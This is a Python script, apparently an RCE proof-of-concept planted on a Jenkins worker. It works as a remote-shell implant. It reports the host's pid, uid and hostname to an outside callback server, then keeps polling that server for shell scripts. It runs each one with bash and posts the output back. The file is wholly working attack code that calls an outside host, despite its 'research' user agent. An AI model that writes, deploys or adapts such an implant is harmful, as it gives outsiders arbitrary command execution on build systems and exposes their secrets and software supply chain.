import json
import os
import subprocess
import time
import urllib.error
import urllib.request

CALLBACK_URL = "https://luci-rce-receiver-o324i7mbdq-uc.a.run.app"
SESSION = "ac3cfd7ccfbe1b995601249c77fe3ee1071a884dfd5655418a06ad493fff3dde"
PREFIX = CALLBACK_URL + "/v1/session/" + SESSION
START = time.time()


def request(path, method="GET", payload=None, timeout=15):
    headers = {"User-Agent": "luci-rce-research", "X-Probe-Session": SESSION}
    data = None
    if payload is not None:
        data = json.dumps(payload).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(PREFIX + path, data=data, method=method, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as response:
        raw = response.read().decode()
        return response.status, json.loads(raw) if raw else {}


runtime = {"pid": os.getpid(), "uid": os.getuid(), "hostname": os.uname().nodename}
request("/receipt", "POST", {"kind": "jenkins-dynamic-worker-online-v1", "data": runtime})
while time.time() - START < 720:
    try:
        status, command = request("/command")
    except Exception:
        time.sleep(2)
        continue
    if status == 204:
        time.sleep(2)
        continue
    command_id = command["id"]
    script = command["script"]
    if script == "__STOP__":
        request("/result", "POST", {
            "id": command_id, "returncode": 0, "stdout": "stopped\n",
            "stderr": "", "duration_ms": 0, "runtime": runtime,
        })
        break
    started = time.time()
    try:
        completed = subprocess.run(
            ["/bin/bash", "-lc", script], cwd="/tmp", text=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            timeout=command["timeout_seconds"],
        )
        result = {
            "id": command_id, "returncode": completed.returncode,
            "stdout": completed.stdout[-49152:], "stderr": completed.stderr[-16384:],
            "duration_ms": int((time.time() - started) * 1000), "runtime": runtime,
        }
    except subprocess.TimeoutExpired as error:
        result = {
            "id": command_id, "returncode": 124,
            "stdout": (error.stdout or "")[-49152:] if isinstance(error.stdout, str) else "",
            "stderr": "command timeout", "duration_ms": int((time.time() - started) * 1000),
            "runtime": runtime,
        }
    request("/result", "POST", result)
